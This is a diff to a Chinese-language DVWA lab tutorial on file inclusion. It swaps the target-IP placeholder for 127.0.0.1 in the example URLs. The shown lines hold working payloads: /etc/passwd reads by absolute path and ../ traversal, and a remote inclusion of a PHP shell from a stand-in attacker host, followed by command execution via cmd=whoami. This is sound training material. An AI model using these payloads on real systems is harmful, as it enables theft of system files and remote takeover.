@@ -36,7 +36,7 @@ include($file);
 页面默认 URL 类似：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/fi/?page=include.php
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=include.php
 ```
 
 页面正常显示。
@@ -46,7 +46,7 @@ http://靶机IP/dvwa/vulnerabilities/fi/?page=include.php
 在 Linux 环境下，尝试读取 `/etc/passwd`：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/fi/?page=/etc/passwd
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/etc/passwd
 ```
 
 如果直接使用绝对路径成功，页面会显示 `/etc/passwd` 的内容。
@@ -54,7 +54,7 @@ http://靶机IP/dvwa/vulnerabilities/fi/?page=/etc/passwd
 如果绝对路径被限制或需要相对路径，可以使用 `../` 逐级向上跳转：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
 ```
 
 具体需要多少个 `../` 取决于当前脚本所在目录深度。可以从 1 开始逐步增加，直到成功读取。
@@ -130,13 +130,13 @@ http://攻击者IP/shell.txt
 在 DVWA 中提交：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/fi/?page=http://攻击者IP/shell.txt
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://攻击者IP/shell.txt
 ```
 
 如果成功，页面会执行 `shell.txt` 中的 PHP 代码。随后可以通过 `cmd` 参数执行系统命令：
 
 ```text
-http://靶机IP/dvwa/vulnerabilities/fi/?page=http://攻击者IP/shell.txt&cmd=whoami
+http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://攻击者IP/shell.txt&cmd=whoami
 ```
 
 ### 4. 使用 data:// 伪协议
@@ -160,7 +160,7 @@ http://靶机IP/dvwa/vulnerabilities/fi/?page=http://攻击者IP/shell.txt&cmd=w
 1. 拦截请求：
    ```http
     GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1
-    Host: 靶机IP
+    Host: 127.0.0.1
     Cookie: PHPSESSID=...; security=low
    ```
 2. 将 `page` 改为：
